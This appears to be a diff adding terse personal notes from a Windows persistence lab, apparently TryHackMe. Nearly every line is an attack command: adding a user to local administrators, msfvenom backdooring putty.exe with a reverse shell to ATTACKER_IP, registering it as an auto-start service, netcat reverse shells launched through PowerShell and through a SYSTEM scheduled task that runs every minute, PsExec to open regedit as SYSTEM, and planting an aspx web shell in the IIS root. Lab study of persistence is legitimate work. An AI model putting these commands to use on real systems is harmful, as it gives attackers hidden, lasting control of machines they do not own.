@@ -1,1 +1,23 @@
+Assign Group Memberships
+C:\> net localgroup administrators thmuser0 /add
+net localgroup "Backup Operators" thmuser1 /add
 
+Backdooring files
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+sc.exe create THMservice2 binPath= "C:\windows\puttyX.exe.exe" start= auto
+sc.exe start THMservice2
+
+powershell script to execute rev shell
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+
+Taks scheduler
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+
+Making files mr india
+ c:\tools\pstools\PsExec64.exe -s -i regedit
+
+WEB persistence
+move shell.aspx C:\inetpub\wwwroot\
